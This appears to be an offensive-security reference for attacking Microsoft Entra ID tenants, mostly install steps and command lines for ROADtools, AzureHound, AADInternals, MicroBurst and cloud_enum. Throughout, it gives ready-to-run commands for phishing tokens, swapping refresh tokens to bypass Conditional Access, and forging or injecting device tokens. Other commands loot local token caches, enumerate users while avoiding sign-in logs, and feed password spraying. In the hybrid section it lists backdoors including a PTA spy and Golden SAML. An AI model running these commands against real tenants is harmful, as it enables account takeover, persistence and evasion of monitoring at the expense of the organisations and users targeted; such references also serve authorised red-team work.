# Entra ID tooling reference

Install + full command reference for the four core toolsets, plus the AAD-Graph
retirement caveat. Examples use example.com and placeholder GUIDs.

## ROADtools (roadrecon + roadtx + roadlib) — dirkjanm

```bash
pip install -U roadrecon roadtx roadlib
# bleeding edge / MS Graph work:
pip install "git+https://github.com/dirkjanm/ROADtools@<branch>#subdirectory=roadrecon"
```

### roadrecon

Auth (writes `.roadtools_auth` in CWD):

```bash
roadrecon auth -u user@example.com -p 'Passw0rd!'          # ROPC
roadrecon auth --device-code                                # device-code flow
roadrecon auth --access-token <jwt>                         # bring your own
roadrecon auth --refresh-token <rt>                         # refresh-token redeem
roadrecon auth -t <tenant-id> --prt-cookie <x-ms-RefreshTokenCredential>
roadrecon auth -r https://graph.microsoft.com/              # pick resource
```

Gather and browse:

```bash
roadrecon gather                       # full dump -> roadrecon.db (SQLite)
roadrecon gather --mfa                 # also per-user MFA methods (needs rights)
roadrecon gather -d custom.db -f .roadtools_auth
roadrecon gui                          # Flask UI on 127.0.0.1:5000
roadrecon gui -d custom.db --debug
```

Plugins:

```bash
roadrecon plugin policies              # parse CA policies -> caps.html (open in browser)
roadrecon plugin bloodhound            # legacy neo4j ingestion (BloodHound legacy only)
roadrecon plugin xlsexport -f out.xlsx # everything to Excel
roadrecon plugin road2timeline         # object-creation timeline
roadrecon dump                         # raw JSON dump instead of DB
```

### AAD Graph retirement — the current caveat

Classic `roadrecon gather` uses the **legacy Azure AD Graph**
(`https://graph.windows.net`, api-version 1.61-internal). Microsoft is retiring
AAD Graph; tenants progressively get `403`, `Authentication_Unauthorized`, or
"Application is not supported / is retired" when the gather starts.

How to check what you're running against:

1. `roadrecon --version` and `pip show roadrecon` — compare with the GitHub
   README; dirkjanm has published MS-Graph-era work on branches (commonly named
   `msgraph`) and there are community forks that re-point gather at
   `https://graph.microsoft.com`.
2. Test cheaply before a full gather: `roadrecon auth ... -r https://graph.windows.net/`
   then one authenticated GET; if the token is refused for AAD Graph but works
   for MS Graph, the tenant has the retirement enforcement on.
3. **Fork behavior varies.** After any gather, verify the DB:
   `sqlite3 roadrecon.db ".tables"` and
   `select count(*) from Users; select count(*) from Policies;` —
   MS-Graph-based gathers may miss or rename `Policies`,
   `OAuth2PermissionGrants`, device/BitLocker data, and the internal-API-only
   fields (e.g., full CA policy JSON). If a table you need is empty, pull it
   yourself from MS Graph (`az rest --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"`
   needs `Policy.Read.All`) or via AADInternals.
4. Fallback stack when roadrecon can't gather: AzureHound (MS Graph native) for
   structure + BloodHound paths; AADInternals for tenant settings; raw
   `az rest`/curl against `graph.microsoft.com` for anything else.

### roadtx (ROADtools Token eXchange)

Client aliases (`-c`): `azcli`, `azps` (Azure AD PowerShell), `msteams`,
`msedge`, `office`, `onedrive`, `outlook`, `broker`, or any raw client GUID.
Resource aliases (`-r`): `msgraph`, `aadgraph`, `azrm`/`azurerm`, `outlook`,
`devicereg`, or a raw URL/app-id. Tokens cached in `.roadtools_auth`, PRTs in
`.roadtools_prt`.

```bash
roadtx gettokens -u user@example.com -p 'Passw0rd!' -c azcli -r msgraph
roadtx gettokens --device-code -c msteams              # phishable flow
roadtx gettokens --refresh-token <rt> -c azcli -r azrm
roadtx gettokens --refresh-token file -r msgraph       # RT from .roadtools_auth
roadtx refreshtokento -c msedge -r msgraph             # FOCI client/resource swap
roadtx describe < .roadtools_auth                      # decode token claims
roadtx getscope -s openid -s https://graph.microsoft.com/.default
```

**FOCI abuse:** first-party "Family of Client IDs" clients (Teams, Edge, Office,
Azure CLI/PowerShell, OneDrive, Authenticator...) share refresh tokens — an RT
issued to one redeems for access tokens as **any** family member, for any
resource that client can access. Practical effect: a Teams RT becomes an Azure
CLI ARM token or an Outlook token. `refreshtokento` does the swap in one line.
CA policies that target "Office 365" but not "Microsoft Azure Management" (or
vice versa) are bypassed by picking the right client/resource pair.

Device + PRT:

```bash
roadtx device -a register -n DESKTOP-EXAMPLE           # cert+key: DESKTOP-EXAMPLE.pem/.key
roadtx device -a join -n SRV-EXAMPLE                   # full AAD join (more rights)
roadtx prt -u user@example.com -p 'Passw0rd!' -c DESKTOP-EXAMPLE.pem -k DESKTOP-EXAMPLE.key
roadtx prt -a renew                                    # refresh the PRT
roadtx prt --refresh-token <rt> -c dev.pem -k dev.key  # PRT from an RT
roadtx prtauth -c msedge -r msgraph                    # tokens from PRT (adds deviceid/MFA claims)
roadtx prtenrich -u user@example.com                   # upgrade PRT with MFA claim (NGC)
roadtx browserprtauth --url https://portal.azure.com   # inject PRT cookie into a browser
roadtx interactiveauth -u user@example.com -p 'Passw0rd!' -r msgraph   # selenium keylogged flow
roadtx keepassauth -u user@example.com -kp passwords.kdbx              # creds from KeePass
roadtx getotp -s <totp-seed>                           # TOTP for MFA'd flows
roadtx winhello -k winhello.key                        # Windows Hello key provisioning
```

A PRT (or PRT cookie `x-ms-RefreshTokenCredential`) satisfies "compliant/
hybrid-joined device" and often MFA CA requirements — it's the strongest token
artifact in the tenant.

## AzureHound (SpecterOps / BloodHound collector)

Install: download the release binary from github.com/SpecterOps/AzureHound (or
`go install`). MS Graph + ARM native — unaffected by AAD Graph retirement.

```bash
azurehound list -u 'user@example.com' -p 'Passw0rd!' --tenant <tenant-id-or-domain> -o azurehound.json
azurehound list --refresh-token <rt> --tenant <tenant-id> -o azurehound.json
azurehound list --jwt <access-token> --tenant <tenant-id> -o azurehound.json
azurehound list -a <app-id> -s <client-secret> --tenant <tenant-id> -o azurehound.json   # SP auth
azurehound list -a <app-id> --cert cert.pem --key key.pem --tenant <t> -o out.json       # SP cert
```

Scoped collection (faster, quieter):

```bash
azurehound list users groups roles apps service-principals --tenant <t> -o entra-only.json
azurehound list az-rm --tenant <t> -o arm-only.json        # ARM side only
azurehound list group-members app-owners service-principal-owners group-owners --tenant <t> -o edges.json
```

Useful flags: `--proxy http://127.0.0.1:8080`, `-v 2` (debug), `--config`
(BloodHound Enterprise continuous mode: `azurehound configure` + `azurehound start`).

Output format: `{"meta": {...}, "data": [{"kind": "AZUser", "data": {...}}, ...]}`.
Import into BloodHound CE via the file-upload API/UI, or feed it to
`scripts/parse_azurehound.py` for rupu work units. Edge glossary and hunting
queries: `references/entra-privesc.md`.

## AADInternals — Nestori Syynimaa (@DrAzureAD)

```powershell
Install-Module AADInternals        # PowerShell 5/7, also works on pwsh/Linux
Import-Module AADInternals
```

Outsider (no auth):

```powershell
Invoke-AADIntReconAsOutsider -DomainName example.com | Format-Table
Invoke-AADIntReconAsOutsider -UserName user@example.com -Single
Invoke-AADIntUserEnumerationAsOutsider -UserName user@example.com          # Normal method
Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Login   # also: Autologon
Get-AADIntTenantID -Domain example.com
Get-AADIntTenantDomains -Domain example.com        # autodiscover federation info
Get-AADIntLoginInformation -UserName user@example.com
```

Token acquisition (each caches with `-SaveToCache`):

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache     # ARM
Get-AADIntAccessTokenForEXO / ForSPO / ForTeams / ForAADJoin / ForIntuneMDM
Get-AADIntAccessTokenWithRefreshToken -Resource https://graph.microsoft.com -ClientId <id> -RefreshToken <rt> -TenantId <t>
```

Insider recon + directory ops:

```powershell
Invoke-AADIntReconAsInsider
Get-AADIntUsers; Get-AADIntUser -UserPrincipalName user@example.com
Get-AADIntTenantDetails; Get-AADIntConditionalAccessPolicies; Get-AADIntAzureADPolicies
Get-AADIntServicePrincipals; Get-AADIntRoleMembers   # directory roles + members
Set-AADIntUserPassword / Set-AADIntUser            # with sufficient role
```

Device / PRT / hybrid:

```powershell
Join-AADIntDeviceToAzureAD -DeviceName "DESKTOP-EXAMPLE" -DeviceType "Windows" -OSVersion "10.0.19045"
Get-AADIntUserPRTToken                              # PRT cookie from a joined host (BrowserCore)
New-AADIntUserPRTToken -RefreshToken <prt> -SessionKey <key>
Export-AADIntAzureCliTokens; Export-AADIntTeamsTokens   # local token cache looting
# Hybrid: Get-AADIntSyncCredentials (on the AAD Connect box), Set-AADIntAzureADObject,
# Install-AADIntPTASpy (PTA backdoor), ConvertTo-AADIntBackdoor (federation backdoor),
# New-AADIntSAMLToken / Open-AADIntOffice365Portal (Golden SAML with a stolen ADFS cert)
```

## MicroBurst (NetSPI) + cloud_enum

```powershell
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base example -Verbose
# permutation-based: *.onmicrosoft.com, *.blob.core.windows.net, *.azurewebsites.net,
# *.database.windows.net, *.vault.azure.net, *.scm.azurewebsites.net ...
Invoke-EnumerateAzureBlobs -Base example -Permutations permutations.txt -OutputFile blobs.txt
```

```bash
pip install cloud_enum   # or clone initstring/cloud_enum
cloud_enum -k example -k example.com -k exampledev --disable-aws --disable-gcp -l out.txt
```

Readable storage containers → `azure-enumeration`; creds in blobs →
`cloud-credential-enumeration`.

## o365creeper-style user enumeration

o365creeper (and successors like Oh365UserFinder, onedrive_user_enum,
MSOLSpray's validation mode, TREVORspray `--recon`) wrap the same oracles the
bundled `scripts/entra_recon.py` uses:

- `GetCredentialType` JSON (`IfExistsResult`): 0 = exists, 1 = not,
  5 = exists w/ different IdP, 6 = exists in both; `ThrottleStatus: 1` means
  the answer is throttled noise — rotate source or slow down.
- OneDrive host check: `https://<tenant>-my.sharepoint.com/personal/<user>_example_com/_layouts/15/onedrive.aspx`
  → 403 = valid user, 404 = invalid (no login attempt logged).
- Autologon (`autologon.microsoftazuread-sso.com`) ROPC — error codes
  distinguish bad-user vs bad-password vs MFA; historically does not log to
  the sign-in log the same way.

Validated users feed password spraying (MSOLSpray, TREVORspray, roadtx
`gettokens` in a loop) and device-code phishing target lists.
